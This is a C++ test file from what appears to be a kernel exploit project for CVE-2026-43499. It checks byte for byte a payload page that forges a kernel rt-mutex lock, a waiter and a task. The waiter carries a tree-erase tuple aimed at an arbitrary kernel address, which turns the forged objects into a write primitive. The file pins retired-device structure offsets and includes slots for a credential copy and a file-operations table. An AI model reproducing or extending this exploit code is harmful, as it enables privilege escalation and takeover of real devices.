/** @file tests/payload_page_test.cpp
 *  The payload page, pinned byte for byte against the retired device values.
 *
 *  The offsets below are the retired tree's own (its prepare_skb_payload compact branch and the
 *  constants table beside it), which is what makes this a pin rather than a preference: if a field
 *  moves, the walk stops reaching the erase, and that is a device run and not a comment. What the
 *  test checks is therefore the whole page: the fabricated lock, the fabricated waiter's head and
 *  erase tuple, the two pointers that connect them, and the fabricated task whose priority has to be
 *  above the real-time threshold.
 *
 *  The refusals matter as much as the bytes: a page that would put an object on top of undeclared
 *  space, or a field that would fall outside the buffer, must leave the buffer exactly as it was --
 *  a half-built page is one the walk reads as a real object.
 */
#include <cstddef>
#include <cstdint>
#include <cstdio>

#include "backend/cve_2026_43499/memory/payload_page.hpp"

namespace {
    using ghostlock::backend::cve_2026_43499::memory::build_payload_page;
    using ghostlock::backend::cve_2026_43499::memory::PayloadPageInputs;
    using ghostlock::backend::cve_2026_43499::memory::PayloadPageVerdict;
    using ghostlock::backend::cve_2026_43499::memory::WriteLayout;
    using ghostlock::backend::cve_2026_43499::memory::WriteMode;
    using ghostlock::backend::cve_2026_43499::memory::WriteRequest;

    std::size_t g_failures = 0U;

    void expect(bool condition, const char *what) {
        if (!condition) {
            std::printf("FAIL: %s\n", what);
            ++g_failures;
        }
    }

    std::uint64_t word_at(const std::uint8_t *page, std::size_t at) noexcept {
        std::uint64_t value = 0U;
        for (std::size_t i = 0U; i < 8U; ++i) {
            value |= static_cast<std::uint64_t>(page[at + i]) << (8U * i);
        }
        return value;
    }

    std::uint32_t half_at(const std::uint8_t *page, std::size_t at) noexcept {
        return static_cast<std::uint32_t>(page[at]) |
               (static_cast<std::uint32_t>(page[at + 1U]) << 8U) |
               (static_cast<std::uint32_t>(page[at + 2U]) << 16U) |
               (static_cast<std::uint32_t>(page[at + 3U]) << 24U);
    }

    /** The retired table: the page slots, the object fields and the two values. */
    PayloadPageInputs retired_inputs() noexcept {
        PayloadPageInputs inputs{};
        inputs.slots.lock = 0x0E80U;
        inputs.slots.waiter = 0x1180U;
        inputs.slots.fake_task = 0x1280U;
        inputs.slots.cred_copy = 0x1080U;
        inputs.slots.fops_table = 0x0F80U;

        inputs.lock.owner = 0x00U;
        inputs.lock.wait_lock = 0x08U;
        inputs.lock.wait_list = 0x10U;
        inputs.lock.list_link = 0x18U;

        inputs.waiter.head_word = 0x00U;
        inputs.waiter.head_next = 0x08U;
        inputs.waiter.head_prev = 0x10U;
        inputs.waiter.pc = 0x18U;
        inputs.waiter.right = 0x20U;
        inputs.waiter.left = 0x28U;
        inputs.waiter.task = 0x30U;
        inputs.waiter.lock = 0x38U;
        inputs.waiter.wake_state = 0x40U;
        inputs.waiter.prio = 0x44U;
        inputs.waiter.deadline = 0x48U;
        inputs.waiter.ww_ctx = 0x50U;

        inputs.task.usage = 0x40U;
        inputs.task.prio = 0x84U;
        inputs.task.normal_prio = 0x8CU;
        inputs.task.pi_lock = 0x90CU;
        inputs.task.pi_waiters = 0x920U;
        inputs.task.pi_top_task = 0x930U;
        inputs.task.pi_blocked_on = 0x938U;
        inputs.task.group = 0x348U;

        inputs.values.task_usage = 0x100U;
        inputs.values.task_prio = 120U;
        inputs.values.waiter_prio = 140U;

        inputs.waiter_word = 0xFFFF800000100000ULL + 0x1180ULL;
        inputs.fake_task = 0xFFFF800000100000ULL + 0x1280ULL;
        inputs.fake_lock = 0xFFFF800000100000ULL + 0x0E80ULL;
        inputs.pointer_bytes = sizeof(std::uintptr_t);
        return inputs;
    }

    /* The region is not one page: the retired layout puts the fabricated task at 0x1280 and its
     *  fields above that, so the buffer the alignment step produces (the page times eight) is the
     *  one that holds it. */
    constexpr std::size_t kRegionBytes = 0x8000U;

    /** A preserving write: the tuple carries the value and aims at the target. */
    void a_preserving_write_lays_the_page_out() {
        std::uint8_t page[kRegionBytes] = {};
        const PayloadPageInputs inputs = retired_inputs();
        WriteRequest request{};
        request.target = 0xFFFFFFC000235EE0ULL;
        request.mode = WriteMode::Zero;
        request.preserve_child = true;
        WriteLayout layout{};
        layout.value = static_cast<std::uintptr_t>(inputs.waiter_word) + 0x100U;
        expect(build_payload_page(page, sizeof(page), inputs, request, layout) ==
                   PayloadPageVerdict::Ok,
               "a page with the retired layout is built");

        /* The lock: unheld, and both of its list words pointing at the waiter's first word. */
        expect(half_at(page, 0x0E80U) == 0U, "the fabricated lock's owner word is clear");
        expect(word_at(page, 0x0E88U) == inputs.waiter_word &&
                   word_at(page, 0x0E90U) == inputs.waiter_word,
               "and its list points at the fabricated waiter's first word");
        expect(word_at(page, 0x0E98U) == (inputs.fake_task | 1U),
               "with the held bit set on the task pointer, which is what makes the walk take the slow path");

        /* The waiter: the three head words, the erase tuple, and the two connecting pointers. */
        expect(word_at(page, 0x1180U) == 1U, "the waiter's first word is the retired one");
        expect(word_at(page, 0x1188U) == 0U && word_at(page, 0x1190U) == 0U,
               "and its two neighbours are cleared");
        expect(word_at(page, 0x1198U) == layout.value, "the tuple's first word is the value carried");
        expect(word_at(page, 0x11A0U) == 0U, "the second is clear, which is what makes it an erase");
        expect(word_at(page, 0x11A8U) == request.target, "and the third is the write's target");
        expect(word_at(page, 0x11B0U) == inputs.fake_task, "the waiter's task is the fabricated one");
        expect(word_at(page, 0x11B8U) == inputs.fake_lock, "and its lock is the fabricated lock");
        expect(half_at(page, 0x11C0U) == 0U, "the wake state is cleared");
        expect(half_at(page, 0x11C4U) == 140U, "the waiter's priority is the retired one");
        expect(word_at(page, 0x11C8U) == 0U && word_at(page, 0x11D0U) == 0U,
               "deadline and context are cleared");

        /* The task: a live usage count, a priority above the threshold, and cleared pi fields. */
        expect(half_at(page, 0x12C0U) == 0x100U, "the fabricated task is alive");
        expect(half_at(page, 0x1304U) == 120U && half_at(page, 0x130CU) == 120U,
               "its priority and normal priority are the retired ones");
        expect(half_at(page, 0x1280U + 0x90CU) == 0U, "its pi lock is cleared");
        expect(word_at(page, 0x1280U + 0x920U) == 0U && word_at(page, 0x1280U + 0x928U) == 0U,
               "its pi waiters list is cleared whole");
        expect(word_at(page, 0x1280U + 0x930U) == 0U && word_at(page, 0x1280U + 0x938U) == 0U,
               "and so are the top task and the blocked pointer");
    }

    /** A leaf write: the tuple carries the target's parent and no side field. */
    void a_leaf_write_carries_no_value() {
        std::uint8_t page[kRegionBytes] = {};
        const PayloadPageInputs inputs = retired_inputs();
        WriteRequest request{};
        request.target = 0xFFFFFFC000200000ULL;
        request.mode = WriteMode::Zero;
        request.preserve_child = false;
        WriteLayout layout{};
        layout.parent = static_cast<std::uintptr_t>(request.target) - sizeof(std::uintptr_t);
        expect(build_payload_page(page, sizeof(page), inputs, request, layout) ==
                   PayloadPageVerdict::Ok,
               "a leaf write builds the same page with a different tuple");
        expect(word_at(page, 0x1198U) == layout.parent, "the tuple's first word is the target's parent");
        expect(word_at(page, 0x11A0U) == 0U && word_at(page, 0x11A8U) == 0U,
               "with both side fields clear, which is the leaf shape");
    }

    void what_cannot_be_built_is_refused_without_touching_the_page() {
        std::uint8_t page[kRegionBytes] = {};
        for (std::size_t i = 0U; i < sizeof(page); ++i) {
            page[i] = 0xAAU;
        }
        PayloadPageInputs inputs = retired_inputs();
        WriteRequest request{};
        request.target = 0x1000U;
        request.mode = WriteMode::Zero;
        WriteLayout layout{};
        layout.value = 0x2000U;

        inputs.slots.waiter = 0U;
        expect(build_payload_page(page, sizeof(page), inputs, request, layout) ==
                   PayloadPageVerdict::SlotsInvalid,
               "an undeclared slot is refused by name rather than read as offset zero");
        inputs = retired_inputs();
        expect(build_payload_page(page, 0x1000U, inputs, request, layout) ==
                   PayloadPageVerdict::NoRoom,
               "a buffer that cannot hold the layout is refused");
        inputs.pointer_bytes = 9U;
        expect(build_payload_page(page, sizeof(page), inputs, request, layout) ==
                   PayloadPageVerdict::WidthInvalid,
               "and a pointer width this build cannot write is refused");
        expect(build_payload_page(nullptr, sizeof(page), retired_inputs(), request, layout) ==
                   PayloadPageVerdict::NoRoom,
               "and nothing to write into is refused");
        bool untouched = true;
        for (std::size_t i = 0U; i < sizeof(page); ++i) {
            if (page[i] != 0xAAU) {
                untouched = false;
            }
        }
        expect(untouched, "and every refusal left the page exactly as it was");
    }
}  // namespace

int main() {
    std::printf("payload page: a preserving write\n");
    a_preserving_write_lays_the_page_out();
    std::printf("payload page: a leaf write\n");
    a_leaf_write_carries_no_value();
    std::printf("payload page: what cannot be built\n");
    what_cannot_be_built_is_refused_without_touching_the_page();
    if (g_failures != 0U) {
        std::printf("payload page: FAIL (%zu)\n", g_failures);
        return 1;
    }
    std::printf("payload page: PASS (lock, waiter, tuple, task; refusals inert)\n");
    return 0;
}
